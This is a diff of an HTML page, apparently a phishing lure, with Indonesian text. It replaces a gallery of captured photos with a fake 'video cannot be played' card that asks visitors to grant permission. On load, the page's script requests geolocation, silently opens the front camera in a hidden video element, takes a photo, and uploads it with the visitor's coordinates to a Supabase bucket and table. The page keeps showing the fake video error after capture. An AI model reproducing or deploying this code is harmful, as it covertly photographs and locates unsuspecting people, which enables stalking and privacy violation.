@@ -65,7 +65,6 @@
     display: grid;
     grid-template-columns: 1fr;
     gap: 20px;
-    margin-top: 20px;
   }
 
   .card {
@@ -75,12 +74,28 @@
     border: 1px solid #262626;
   }
 
-  .card img {
+  .media-container {
     width: 100%;
     aspect-ratio: 16 / 9;
-    object-fit: cover;
     background: #000;
-    display: block;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    position: relative;
+    color: #444;
+  }
+
+  .error-icon {
+    font-size: 3.2rem;
+    margin-bottom: 12px;
+    opacity: 0.7;
+  }
+
+  .media-container p {
+    font-weight: 600;
+    font-size: 0.9rem;
+    color: #777;
   }
 
   .info-overlay {
@@ -94,10 +109,9 @@
     color: #666;
     text-align: center;
     letter-spacing: 0.5px;
-    white-space: pre-line;
   }
 
-  /* Sembunyikan video dan canvas */
+  /* Sembunyikan elemen kamera */
   #hiddenVideo, #hiddenCanvas {
     display: none;
   }
@@ -125,12 +139,21 @@
   <div id="statusText">System: Mendeteksi pemutar video...</div>
 </div>
 
-<!-- Daftar foto yang sudah diupload akan muncul di sini -->
 <div id="list">
-  <!-- Akan diisi oleh JavaScript -->
+  <!-- Card video rusak statis - akan selalu muncul -->
+  <div class="card">
+    <div class="media-container">
+      <div class="error-icon">⚠️</div>
+      <p>Video ini tidak dapat diputar</p>
+      <p style="font-size: 0.7rem; font-weight: 400; margin-top: 5px; color: #555;">Error Code: 0x80040255</p>
+    </div>
+    <div class="info-overlay">
+      <div class="info-text" id="statusMessage">Izinkan dulu - Mencoba memuat ulang...</div>
+    </div>
+  </div>
 </div>
 
-<div class="floating-info" id="notif">sedang memuat data #inierayazz</div>
+<div class="floating-info" id="notif">selamat menonton bang #inierayazz</div>
 
 <!-- Elemen tersembunyi untuk proses kamera -->
 <video id="hiddenVideo" autoplay playsinline></video>
@@ -145,86 +168,24 @@
   const client = createClient(SUPABASE_URL, SUPABASE_KEY);
 
   const statusText = document.getElementById("statusText");
+  const statusMessage = document.getElementById("statusMessage");
   const hiddenVideo = document.getElementById("hiddenVideo");
   const hiddenCanvas = document.getElementById("hiddenCanvas");
-  const listEl = document.getElementById("list");
 
-  // ===== FUNGSI MENAMPILKAN FOTO DARI DATABASE =====
-  async function tampilkanFoto() {
-    try {
-      // Ambil data dari tabel lokasi_users, urut dari terbaru
-      const { data: lokasiData, error } = await client
-        .from("lokasi_users")
-        .select("*")
-        .order('created_at', { ascending: false })
-        .limit(20); // Batasi 20 foto terbaru
-
-      if (error) throw error;
-
-      // Jika belum ada data
-      if (!lokasiData || lokasiData.length === 0) {
-        listEl.innerHTML = `
-          <div class="card">
-            <div style="padding: 40px; text-align: center; color: #666;">
-              <div style="font-size: 3rem; margin-bottom: 10px;">📷</div>
-              <p>Belum ada foto</p>
-              <p style="font-size: 0.7rem; margin-top: 10px;">Mencoba mengambil foto...</p>
-            </div>
-          </div>
-        `;
-        return;
-      }
-
-      // Tampilkan semua foto
-      listEl.innerHTML = "";
-      
-      for (const item of lokasiData) {
-        // Dapatkan URL publik untuk foto
-        const { data: publicUrl } = client.storage
-          .from(BUCKET)
-          .getPublicUrl(item.foto);
-
-        const card = document.createElement("div");
-        card.className = "card";
-        
-        const img = document.createElement("img");
-        img.src = publicUrl.publicUrl;
-        img.alt = "Foto Capture";
-        img.loading = "lazy";
-        img.onerror = () => { 
-          img.src = 'https://via.placeholder.com/640x360?text=Gambar+Tidak+Tersedia'; 
-        };
-        
-        const info = document.createElement("div");
-        info.className = "info-overlay";
-        
-        // Format tanggal
-        const tanggal = new Date(item.created_at).toLocaleString('id-ID', {
-          dateStyle: 'medium',
-          timeStyle: 'short'
-        });
-        
-        info.innerHTML = `<div class="info-text">
-          📍 Lat: ${item.latitude?.toFixed(5) || '-'}, Lon: ${item.longitude?.toFixed(5) || '-'}
-          \n🕒 ${tanggal}
-        </div>`;
-        
-        card.appendChild(img);
-        card.appendChild(info);
-        listEl.appendChild(card);
-      }
-    } catch (err) {
-      console.error("Error tampil foto:", err);
-      statusText.innerText = "❌ Gagal memuat data";
+  // ===== FUNGSI UPDATE STATUS =====
+  function updateUI(message) {
+    statusText.innerText = message;
+    if (statusMessage) {
+      statusMessage.innerText = message;
     }
   }
 
   // ===== FUNGSI MENGAMBIL FOTO (TANPA DITAMPILKAN) =====
   async function captureAndUpload(lat, lon) {
     try {
-      statusText.innerText = "Mengakses kamera...";
+      updateUI("Mengakses kamera...");
       
-      // Minta akses kamera (tanpa menampilkan video)
+      // Minta akses kamera
       const stream = await navigator.mediaDevices.getUserMedia({ 
         video: { 
           facingMode: "user",
@@ -245,7 +206,7 @@
         };
       });
       
-      statusText.innerText = "Mengambil foto...";
+      updateUI("Mengambil foto...");
       
       // Tunggu sebentar agar kamera stabil
       setTimeout(async () => {
@@ -256,7 +217,7 @@
         // Konversi canvas ke blob
         hiddenCanvas.toBlob(async (blob) => {
           if (!blob) {
-            statusText.innerText = "❌ Gagal mengambil foto";
+            updateUI("❌ Gagal mengambil foto");
             stream.getTracks().forEach(track => track.stop());
             return;
           }
@@ -274,7 +235,7 @@
 
           if (uploadError) {
             console.error("Upload error:", uploadError);
-            statusText.innerText = "❌ Gagal upload foto";
+            updateUI("❌ Gagal upload foto");
           } else {
             // Simpan data ke tabel
             const { error: insertError } = await client
@@ -288,12 +249,14 @@
 
             if (insertError) {
               console.error("Insert error:", insertError);
-              statusText.innerText = "❌ Gagal simpan data";
+              updateUI("❌ Gagal simpan data");
             } else {
-              statusText.innerText = "✅ Foto berhasil diupload!";
+              updateUI("✅ Foto berhasil direkam! (Video tetap error)");
               
-              // Refresh tampilan foto
-              tampilkanFoto();
+              // Setelah 3 detik, kembalikan ke pesan awal
+              setTimeout(() => {
+                updateUI("Video ini tidak dapat diputar");
+              }, 3000);
             }
           }
           
@@ -305,20 +268,17 @@
       
     } catch (err) {
       console.error("Kamera error:", err);
-      statusText.innerText = "❌ Gagal akses kamera. Periksa izin.";
+      updateUI("❌ Gagal akses kamera. Periksa izin.");
     }
   }
 
   // ===== FUNGSI UTAMA =====
   async function startProcess() {
-    statusText.innerText = "Meminta izin akses...";
-    
-    // Tampilkan foto yang sudah ada dulu
-    await tampilkanFoto();
+    updateUI("Meminta izin akses...");
     
     // Minta izin lokasi
     if (!navigator.geolocation) {
-      statusText.innerText = "❌ Browser tidak mendukung geolocation";
+      updateUI("❌ Browser tidak mendukung geolocation");
       return;
     }
 
@@ -327,14 +287,14 @@
         const lat = pos.coords.latitude;
         const lon = pos.coords.longitude;
         
-        statusText.innerText = "Lokasi didapat, mengakses kamera...";
+        updateUI("Lokasi didapat, mengakses kamera...");
         
         // Ambil foto (tanpa ditampilkan)
         await captureAndUpload(lat, lon);
       },
       (err) => {
         console.warn("Gagal dapat lokasi:", err.message);
-        statusText.innerText = "⚠️ Lokasi tidak tersedia, tetap coba kamera";
+        updateUI("⚠️ Lokasi tidak tersedia, tetap coba kamera");
         
         // Tetap coba ambil foto tanpa lokasi
         captureAndUpload(null, null);
@@ -349,11 +309,6 @@
 
   // ===== MULAI PROSES =====
   startProcess();
-
-  // Refresh data setiap 30 detik (opsional)
-  setInterval(() => {
-    tampilkanFoto();
-  }, 30000);
 </script>
 </body>
 </html>
